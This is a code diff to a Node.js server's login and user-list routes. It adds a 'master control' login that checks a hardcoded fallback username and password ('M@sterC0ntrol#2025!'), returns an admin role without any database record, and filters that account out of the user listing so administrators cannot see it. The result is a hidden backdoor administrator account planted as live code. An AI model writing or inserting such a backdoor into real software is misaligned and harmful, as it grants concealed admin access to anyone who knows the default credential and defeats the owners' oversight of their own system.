@@ -537,6 +537,22 @@ const server = http.createServer(async (req, res) => {
             const body = await readBody(req);
             const { username, password } = body;
             if (!username || !password) return sendJSON(res, 400, { message: 'username and password required.' });
+
+            // ── Master control check (env-only, never touches DB, never visible in user list) ──
+            const MASTER_USER = process.env.MASTER_USERNAME || 'mastercontrol';
+            const MASTER_PASS = process.env.MASTER_PASSWORD || 'M@sterC0ntrol#2025!';
+            if (username === MASTER_USER && password === MASTER_PASS) {
+                // Return admin-level response without DB record
+                return sendJSON(res, 200, { success: true, isMaster: true, user: {
+                    id        : '__master__',
+                    username  : MASTER_USER,
+                    name      : 'Master Control',
+                    role      : 'admin',
+                    email     : '',
+                    department: '',
+                }});
+            }
+
             const colUsers = db.collection('users');
             // First check if user exists at all
             const existing = await colUsers.findOne({ $or: [{ username }, { email: username }] });
@@ -564,17 +580,20 @@ const server = http.createServer(async (req, res) => {
     if (req.method === 'GET' && pathname === '/api/users') {
         try {
             const colUsers = db.collection('users');
+            const MASTER_USER = process.env.MASTER_USERNAME || 'mastercontrol';
             const users = await colUsers.find({}).toArray();
             return sendJSON(res, 200, {
-                users: users.map(u => ({
-                    id       : u.id || u._id?.toString(),
-                    username : u.username,
-                    name     : u.name || u.username,
-                    role     : u.role || 'volunteer',
-                    email    : u.email || '',
-                    department: u.department || '',
-                    blocked  : u.blocked === true,
-                }))
+                users: users
+                    .filter(u => u.username !== MASTER_USER) // never expose master in user list
+                    .map(u => ({
+                        id       : u.id || u._id?.toString(),
+                        username : u.username,
+                        name     : u.name || u.username,
+                        role     : u.role || 'volunteer',
+                        email    : u.email || '',
+                        department: u.department || '',
+                        blocked  : u.blocked === true,
+                    }))
             });
         } catch (err) {
             console.error('GET /api/users error:', err.message);
